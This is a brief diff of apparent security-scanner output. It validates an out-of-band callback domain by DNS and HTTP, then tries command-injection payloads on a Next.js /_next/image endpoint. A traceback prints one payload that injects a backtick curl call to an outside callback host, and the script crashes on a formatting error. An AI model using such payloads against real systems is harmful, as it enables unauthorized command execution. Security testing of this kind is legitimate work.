@@ -1,0 +1,12 @@
+### ORACLE VALIDATION: is the OOB domain a wildcard resolver?
+ DNS oobd843b6015e60.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in -> 3.6.13.234
+ HTTP 200 72
+ DNS totallyrandomnonexistent1790755323.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in -> 3.6.13.234
+ HTTP 200 72
+
+### CMDi payloads on /_next/image
+Traceback (most recent call last):
+  File "/var/lib/scanner/16e69f07-f908-482b-8fc5-492852a61a91/1f5fe7c8-5e28-45bc-8e08-a3e868bad87e/d17/img4.py", line 28, in <module>
+    ("backticks in q", "/_next/image?url="+Q+"&w=640&q=%60curl%20http://%s/cmdi4%60"%CM),
+                                             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^~~
+TypeError: %c requires an int or a unicode character, not a string of length 67
